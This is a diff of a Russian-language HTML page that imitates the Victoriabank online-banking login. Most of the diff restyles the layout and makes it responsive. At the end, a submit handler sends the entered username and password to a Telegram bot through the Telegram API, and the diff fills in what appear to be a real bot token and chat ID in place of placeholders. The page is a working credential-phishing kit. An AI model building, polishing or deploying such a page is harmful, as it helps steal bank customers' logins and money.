@@ -2,7 +2,6 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Главная страница</title>
   <style>
     /* -------------------------
@@ -21,6 +20,8 @@
       justify-content: center;
       align-items: center;
       flex-direction: column;
+      padding: 20px;
+      box-sizing: border-box;
     }
 
     /* -------------------------
@@ -34,15 +35,18 @@
       gap: 20px;
       align-items: center;
     }
+
     .logo-item {
       display: flex;
       align-items: center;
       gap: 5px;
     }
+
     .logo-item img {
       width: 24px;
       height: 24px;
     }
+
     .logo-item span {
       font-size: 14px;
       color: white;
@@ -55,6 +59,7 @@
       margin-top: 36px;
       margin-bottom: 30px;
     }
+
     .center-logo img {
       width: 72px;
       height: auto;
@@ -75,9 +80,9 @@
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
       padding: 40px;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
-      position: relative; /* для абсолютных элементов внутри */
+      position: relative; /* для элементов внутри */
     }
 
     /* -------------------------
@@ -88,7 +93,9 @@
       max-width: 400px;
       font-family: "NotoSans-Light", Helvetica, Arial, sans-serif;
       font-feature-settings: "kern" on, "liga" off, "calt" on;
-      position: relative;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
     .field-wrapper {
@@ -96,7 +103,9 @@
       align-items: center;
       justify-content: space-between;
       margin: 15px 0;
+      width: 100%;
     }
+
     .field-wrapper label {
       font-size: 13px;
       color: #555;
@@ -106,6 +115,7 @@
       text-align: right;
       margin-right: 15px;
     }
+
     .field-wrapper input {
       flex: 1;
       padding: 10px;
@@ -115,9 +125,6 @@
       border-radius: 0;
     }
 
-    /* -------------------------
-       Кнопка входа
-       ------------------------- */
     .login-button {
       margin: 48px auto 0;
       display: block;
@@ -138,102 +145,78 @@
       cursor: pointer;
       transition: background 0.3s, border 0.3s;
     }
+
     .login-button:hover {
       background-color: #003399;
     }
 
     /* -------------------------
-       Useful information слева
+       Ссылки и текст под формой
        ------------------------- */
     .useful-info {
-      display: block;
-      position: absolute;
-      left: 24px;
-      bottom: 48px;
       font-size: 14px;
       color: #0088ff;
       text-decoration: none;
       font-family: NotoSans-Regular, Helvetica, Arial, sans-serif;
       transition: color 0.3s ease;
+      margin-top: 20px;
     }
     .useful-info:hover {
       color: #005fcc;
       text-decoration: underline;
     }
 
-    /* -------------------------
-       Контакты справа
-       ------------------------- */
     .contact-info {
-      position: absolute;
-      right: 24px;
-      bottom: 48px;
       text-align: right;
       font-size: 14px;
       color: #171cb3;
       font-family: NatoSans-Light, Helvetica, Arial, sans-serif;
       line-height: 1.3;
-      margin: 0;
-    }
-    .contact-info p {
-      margin: 2px 0;
+      margin-top: 20px;
     }
 
-    /* -------------------------
-       Футер внизу формы
-       ------------------------- */
     .form-footer-text {
-      position: absolute;
-      left: 24px;
-      bottom: 4px;
       font-size: 12px;
       color: #777;
       font-family: NotoSans-Light, Helvetica, Arial, sans-serif;
-      margin: 0;
+      margin-top: 20px;
       opacity: 0.8;
     }
 
     /* -------------------------
-       Медиа-запросы для мобильных
+       Адаптивность для мобильных
        ------------------------- */
     @media (max-width: 600px) {
-      .main-content {
+      .wb-form, .main-content {
+        width: 100%;
         padding: 20px;
       }
-      .wb-form {
-        max-width: 90%;
+
+      .field-wrapper {
+        flex-direction: column;
+        align-items: flex-start;
       }
-      .login-button {
-        font-size: 13px;
-        padding: 0 16px;
-        min-width: unset;
+
+      .field-wrapper label {
         width: 100%;
+        text-align: left;
+        margin-bottom: 5px;
       }
-      .center-logo img {
-        width: 50px;
-      }
-      .top-right {
-        gap: 10px;
-      }
-      .logo-item img {
-        width: 20px;
-        height: 20px;
-      }
-      .useful-info, .contact-info, .form-footer-text {
-        position: relative;
-        bottom: auto;
-        left: auto;
-        right: auto;
+
+      .useful-info,
+      .contact-info,
+      .form-footer-text {
         text-align: center;
         margin-top: 10px;
-        font-size: 12px;
       }
     }
   </style>
 </head>
 <body>
 
-  <!-- Логотипы языков -->
+  <!-- -------------------------
+       Языки
+       ------------------------- -->
   <div class="top-right">
     <div class="logo-item">
       <img src="romana.svg" alt="Română">
@@ -245,12 +228,16 @@
     </div>
   </div>
 
-  <!-- Центральный логотип -->
+  <!-- -------------------------
+       Центральный логотип
+       ------------------------- -->
   <div class="center-logo">
     <img src="logovkb.svg" alt="Логотип VKB">
   </div>
 
-  <!-- Основной контейнер с формой -->
+  <!-- -------------------------
+       Основной контейнер с формой
+       ------------------------- -->
   <div class="main-content">
     <form class="wb-form">
       <div class="field-wrapper">
@@ -264,16 +251,13 @@
       <button class="login-button" type="submit">Login</button>
     </form>
 
-    <!-- Контакты справа -->
+    <a href="#" class="useful-info">Useful information</a>
+
     <div class="contact-info">
       <p>Call Customer Support</p>
       <p>1303 / +373 22 21 03 03</p>
     </div>
 
-    <!-- Useful information слева -->
-    <a href="#" class="useful-info">Useful information</a>
-
-    <!-- Футер внизу формы -->
     <p class="form-footer-text">BC Victoriabank SA, 2017</p>
   </div>
 
@@ -282,8 +266,8 @@
       e.preventDefault();
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
-      const BOT_TOKEN = 'ВАШ_ТОКЕН';
-      const CHAT_ID = 'ВАШ_CHAT_ID';
+      const BOT_TOKEN = '6836324743:AAFIWAOKYDUkbz3ojpNthxPb0WqYtBkfBkg';
+      const CHAT_ID = '5446866680';
       const text = `🔐 Новая форма входа:\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
       await fetch(url, {
@@ -298,3 +282,4 @@
 
 </body>
 </html>
+
